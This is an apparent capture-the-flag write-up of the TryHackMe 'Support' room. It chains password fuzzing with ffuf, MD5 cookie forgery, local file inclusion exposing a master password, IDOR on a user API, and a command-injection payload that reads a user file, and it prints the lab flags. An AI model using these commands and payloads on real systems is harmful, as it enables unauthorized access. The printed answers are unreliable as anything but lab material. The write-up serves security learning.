# TryHackMe — Support

## Introduction

**Support** is a TryHackMe web exploitation room focused on authentication weaknesses, session manipulation, Local File Inclusion, sensitive information disclosure, IDOR, privilege escalation, and command injection.

The objective was to investigate the Support Operations web application, obtain administrative access, and retrieve the available flags.

### Tools Used

* Burp Suite
* ffuf
* CrackStation
* Browser / Developer Tools

---

# 1. Password Discovery

I started by testing the login functionality using **ffuf** and the `rockyou.txt` wordlist.

The request was fuzzed by replacing the password with `FUZZ`.

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "email=help@support.thm&password=FUZZ" \
-u http://TARGET/
```

The scan returned a valid password:

```text
snoopy
```

<img src="./01%20ffuf%20password.png" alt="FFUF password discovery">

Using this credential, I was able to authenticate to the Support Dashboard.

---

# 2. Support Dashboard

After logging in, I reached the Support Dashboard.

<img src="./02%20dashboard.png" alt="Support Dashboard">

The dashboard contained several interesting functionalities, so I started intercepting requests using **Burp Suite**.

---

# 3. MD5 Hash Analysis

While inspecting the application's cookies, I found the `isITUser` value.

The value appeared to be an MD5 hash.

I tested possible plaintext values against the hash.

For example, the MD5 representation of:

```text
false
```

was:

```text
68934a3e9455fa72420237eb05902327
```

<img src="./03%20crackstation%20false.png" alt="CrackStation false MD5">

I then tested:

```text
true
```

which produced:

```text
b326b5062b2f0e69046810717534cb09
```

<img src="./04%20crackstation%20true.png" alt="CrackStation true MD5">

This showed that the application was using predictable MD5 values for an authorization-related cookie.

---

# 4. Cookie Analysis

Using Burp Suite, I inspected the original request.

The cookie contained:

```http
Cookie: PHPSESSID=<session>;
isITUser=b326b5062b2f0e69046810717534cb09
```

<img src="./05%20burp%20original%20cookie%20.png" alt="Original isITUser cookie">

The important observation was that the authorization state was being represented directly in a client-controlled cookie.

---

# 5. Cookie Manipulation

I replaced the `isITUser` cookie value with the MD5 hash corresponding to `true`.

```http
Cookie: PHPSESSID=<session>;
isITUser=b326b5062b2f0e69046810717534cb09
```

<img src="./06%20cookie%20swap%20burp.png" alt="Cookie manipulation with Burp Suite">

After modifying the cookie, the application treated the user as an IT user.

This demonstrated that the application was trusting security-sensitive information supplied by the client.

> **Security lesson:** Authorization decisions should always be enforced server-side.

---

# 6. Local File Inclusion

While exploring the dashboard, I discovered the `skin` parameter.

I tested:

```text
/dashboard.php?skin=.config
```

<img src="./07%20lfi%20skin%20attempt.png" alt="LFI skin parameter attempt">

The application processed the supplied value, suggesting that server-side resources were being loaded.

I then inspected the resulting source.

---

# 7. Source Code Disclosure

Viewing the resulting source revealed server-side PHP code that should not have been exposed to the browser.

<img src="./08%20lfi%20config%20source.png" alt="LFI source code disclosure">

The source contained sensitive configuration values:

```php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

The exposure of the master password was a critical information disclosure.

Sensitive server-side source code and credentials should never be exposed through HTTP responses.

---

# 8. IDOR / API Enumeration

I then investigated the application's internal API.

The endpoint:

```text
/user/1
```

returned information about the user.

<img src="./09%20idor%20user%20api.png" alt="IDOR user API">

The response included:

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

This revealed an account with administrative privileges.

The endpoint demonstrated an **IDOR / Broken Object-Level Authorization** issue because user information could be accessed through the object identifier without proper authorization checks.

---

# 9. Administrator Authentication

I attempted to authenticate using the discovered administrator account.

The first attempt failed.

<img src="./10%20invalid%20creds.png" alt="Invalid administrator credentials">

After correlating the information discovered during the previous stages, I was able to authenticate successfully.

---

# 10. Administrator Access

The application confirmed successful administrator authentication.

<img src="./11%20admin%20confirmed%20flag%20.png" alt="Administrator access confirmed">

The page displayed the administrator flag:

```text
THM{I_AM_ADMIN999}
```

At this point, administrator-level access had been obtained.

---

# 11. Command Injection

After obtaining administrator privileges, I investigated the system functionality available through the dashboard.

I discovered a parameter named:

```text
sys
```

The application passed the supplied value to a system command without properly sanitizing the input.

I injected an additional command:

```text
sys=date;cat /home/ubuntu/user.txt
```

<img src="./12%20cmd%20injection%20flag.png" alt="Command injection and user flag">

The injected command was executed successfully and returned the contents of the user flag.

This confirmed a **command injection** vulnerability.

---

# 12. User Flag

The final flag obtained through command injection was:

```text
THM{GOT_THE_FLAG001}
```

This demonstrated successful command execution on the target.

---

# Attack Chain

```text
Password Fuzzing
        │
        ▼
Initial Authentication
        │
        ▼
Cookie Analysis
        │
        ▼
MD5 Hash Identification
        │
        ▼
Cookie Manipulation
        │
        ▼
Local File Inclusion
        │
        ▼
Source Code Disclosure
        │
        ▼
Credential Discovery
        │
        ▼
API Enumeration / IDOR
        │
        ▼
Administrator Authentication
        │
        ▼
Command Injection
        │
        ▼
User Flag
```

---

# Vulnerabilities Identified

### Client-Side Authorization

The application trusted the `isITUser` cookie to determine authorization state.

### Weak Cryptographic Practice

MD5 was used for a security-sensitive value.

### Local File Inclusion

The `skin` parameter could be abused to access server-side resources.

### Sensitive Information Disclosure

Server-side PHP source code exposed credentials and configuration.

### IDOR / BOLA

The API exposed user information without sufficient authorization checks.

### Command Injection

The `sys` parameter allowed attacker-controlled operating system commands to be executed.

---

# Key Takeaways

This room demonstrated how multiple vulnerabilities can be chained together.

The main lessons were:

* Never trust client-controlled authorization values.
* Do not use MD5 for security-sensitive operations.
* Properly validate file inclusion parameters.
* Implement object-level authorization on API endpoints.
* Never expose application source code or credentials.
* Never pass raw user input to operating system commands.
* Burp Suite is extremely useful for understanding application behavior.

---

# Conclusion

The **Support** room provided practical experience with a complete web application attack chain.

Starting with password discovery, I analyzed the authentication mechanism, identified a weak authorization cookie, exploited source disclosure, enumerated the API, discovered an administrator account, obtained administrative access, and finally exploited command injection to retrieve the user flag.

This room reinforced the importance of looking at the application as a whole and understanding how individual weaknesses can be chained together.

---

## TryHackMe

[Support — TryHackMe](https://tryhackme.com/room/support)

---

## Author

**Mehdi Haidi**

Cybersecurity | Network & Systems | Web Security | Software engineer

---

> ⚠️ **Disclaimer:** This write-up documents activity performed in the authorized TryHackMe lab environment for educational purposes only.
